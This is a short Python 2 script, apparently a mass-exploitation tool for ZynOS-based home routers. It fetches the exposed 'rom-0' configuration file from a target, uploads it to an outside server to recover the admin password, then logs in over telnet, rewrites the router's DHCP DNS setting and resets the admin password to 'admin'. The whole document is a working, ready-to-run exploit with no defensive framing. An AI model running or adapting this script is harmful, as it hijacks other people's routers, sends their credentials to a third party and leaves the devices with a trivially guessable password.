#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
reload(sys)
sys.setdefaultencoding("utf-8")

from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from netaddr import IPNetwork
import requests
import urllib
import re
import getpass
import sys
import telnetlib
import time
import os
import socket
import sys
socket.setdefaulttimeout(4)

register_openers()

try:
    os.remove("rom-0")
except:
    pass
try:
    host = str(sys.argv[1])
    urllib.urlretrieve("http://" + host + "/rom-0", "rom-0")

    files, headers = multipart_encode({"uploadedfile": open("rom-0")})

    #request = urllib2.Request("http://198.61.167.113/zynos/decoded.php", files, headers)
    #str1 = urllib2.urlopen(request).read()
    
    r = requests.post('http://198.61.167.113/zynos/decoded.php', files=files, headers=headers)
    str1 = r.text
    
    m = re.search('rows=10>(.*)', str1)
    if m:
        found = m.group(1)   
    tn = telnetlib.Telnet(host, 23, 3)         
    tn.read_until("Password: ") 
    tn.write(found + "\n") 
    tn.write("set lan dhcpdns 8.8.8.8\n")
    tn.write("sys password admin\n")
    print host +" -> Success" 
    tn.write("exit\n")
except:
    print host +" -> Offline!"
